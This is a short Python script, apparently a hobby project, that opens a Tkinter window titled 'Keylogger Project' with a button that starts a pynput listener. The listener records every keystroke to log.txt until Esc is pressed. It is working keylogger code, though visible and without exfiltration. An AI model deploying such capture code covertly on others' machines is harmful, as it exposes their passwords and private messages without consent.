import tkinter as tk
from tkinter import*
import pynput
from pynput.keyboard import Key, Listener


root = tk.Tk()
root.geometry ("250x300")
root.title("Keylogger Project")

keys = []


def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(key.char))

    except AttributeError:
        print('special key {0} pressed'.format(key))


def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            # removing ''
            k = str(key).replace("'", "")
            f.write(k)


            # every keystroke for readability
            f.write(' ')

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener
        return False

def butaction():
    print("keylogger started")
    with Listener(on_press=on_press,
              on_release=on_release) as listener:
        listener.join()

empty= Label(root, text="Keylogger Project", font='Verdana 11 bold').grid(row =2,column=2)
Button (root, text="Start Keylogger", command=butaction).grid(row=5, column=2)
root.mainloop()

    

